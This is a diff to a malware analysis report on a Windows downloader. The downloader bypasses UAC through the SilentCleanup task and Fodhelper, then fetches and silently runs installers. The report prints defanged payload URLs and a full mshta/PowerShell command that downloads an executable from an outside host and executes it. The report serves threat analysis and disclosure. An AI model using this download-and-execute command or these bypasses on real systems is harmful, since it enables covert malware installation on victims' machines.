@@ -17,8 +17,7 @@ The UAC bypass techniques implemented are (https://attack.mitre.org/techniques/T
 * UAC Bypass via SilentCleanup Scheduled Task
 * UAC Bypass via Fodhelper
 
-### Analysis:
-
+### Sample Metadata
 <table>
     <thead>
         <tr>
@@ -59,12 +58,14 @@ The UAC bypass techniques implemented are (https://attack.mitre.org/techniques/T
     </tbody>
 </table>
 
+### Analysis:
+
 This downloader attempts to bypass User Account Control (UAC) to download unwanted files to a system. Upon execution, it conducts the following activity:
  
 Creates a payload objects that contains the URLS and command line arguments for the downloaded file:
 ```
-hxxp://source1[.]kapetownlink[.]com/installer.exe - Args: /qn CAMPAIGN="1640"
-hxxps://setup[.]maskvpn[.]cc/g[.]asp?id=151 - Args: /silent /subid=603
+hxxp://source1.kapetownlink[.]com/installer.exe - Args: /qn CAMPAIGN="1640"
+hxxps://setup.maskvpn[.]cc/g.asp?id=151 - Args: /silent /subid=603
 ```
     
 For each payload URL, it constructs the following command to download additional files from the download URL to **%ProgramData%\<random_string>.exe**.
@@ -73,7 +74,7 @@ For each payload URL, it constructs the following command to download additional
 ```powershell
 @"mshta vbscript:(CreateObject(""Wscript.Shell"")).Run(
 ""cmd /c powershell -Command """"(New-Object System.Net.WebClient).
-DownloadFile('http://source1[.]kapetownlink[.]com/installer.exe', 
+DownloadFile('hxxp://source1.kapetownlink[.]com/installer.exe', 
 (Join-Path -Path $env:ProgramData -ChildPath '5OTP8CZoq3MomB2GxUYrHB8U.exe'))"""" 
 & C:\ProgramData\5OTP8CZoq3MomB2GxUYrHB8U.exe /qn CAMPAIGN=""""1640"""""",0)
 (window.close)"
